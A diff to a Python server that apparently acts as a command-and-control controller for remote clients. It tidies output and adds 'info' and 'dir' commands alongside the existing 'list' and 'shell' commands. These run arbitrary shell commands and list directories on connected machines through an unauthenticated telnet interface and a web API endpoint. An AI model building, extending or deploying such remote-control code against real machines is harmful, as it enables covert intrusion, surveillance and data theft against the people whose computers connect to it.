@@ -21,10 +21,8 @@ def listen_tcp():
         client_socket,address = server.accept() # Accept TCP connection
         conn_name = address[0] + ':' + str(address[1])
         recv_data = client_socket.recv(1024)
-        print(recv_data.decode())
         try:
             json_head = json.loads(recv_data.decode())
-            print('Step in json')
             if json_head['type'] == 'client':
                 print('Connection ' + conn_name + '\n - ' + json_head['content']) # Print connection base info
                 socket_conns[conn_name] = client_socket # add connection to dic
@@ -34,18 +32,18 @@ def listen_tcp():
 
 # endregion
 
-# region Telnet connection
+# region - Telnet connection
 
 class Telnet(threading.Thread):
     def __init__(self, conn, add):
         threading.Thread.__init__(self)
+        self.crlf = (chr(13) + chr(10)).encode('gbk')
         self.inputstr = ''
         self.connection = conn
         self.address = add
     def run(self):
         ii = 0
-        self.connection.send(b'Hello controller')
-        self.connection.send(b'\n>')
+        self.connection.send(b'Hello controller' + self.crlf + b'>')
         while True:
             buf = self.connection.recv(1024)
             if buf.rfind(b'\n') > -1:
@@ -55,12 +53,25 @@ class Telnet(threading.Thread):
                     case 'list':
                         func_return = list_connections()
                         for key in func_return.keys():
-                            self.connection.send(key.encode())
+                            self.connection.send(key.encode() + self.crlf)
                     case 'shell':
                         func_return = exec_shell(conn_address=return_arr[1], command=' '.join(return_arr[2:]))
-                        self.connection.send(func_return.encode('gbk'))
+                        for line in func_return.splitlines():
+                            self.connection.send(line.encode('gbk') + self.crlf)
+                    case 'info':
+                        func_return = get_info(conn_address=return_arr[1])
+                        for value in func_return.values():
+                            self.connection.send(value.encode('gbk') + self.crlf)
+                    case 'dir':
+                        func_return = scan_dir(conn_address=return_arr[1], path=return_arr[2])
+                        self.connection.send(
+                            b'== DIR =======' + self.crlf +
+                            ' | '.join(func_return[0]).encode('gbk') + self.crlf +
+                            b'== FILE ======' + self.crlf +
+                            ' | '.join(func_return[1]).encode('gbk')
+                            )
                 self.inputstr = ''
-                self.connection.send(b'\n>')
+                self.connection.send(self.crlf + b'>')
             else:
                 self.inputstr += buf.decode()
             if ii == 0:
@@ -107,7 +118,6 @@ def list_connections():
 
 @webapi.get("/shell/{conn_address}") # Execute shell in client
 def exec_shell(conn_address:str, command:str=None):
-    print(conn_address + ':' + command)
     try:
         client = socket_conns[conn_address]
         return recv_dyn_socket(client, 'shell', command)
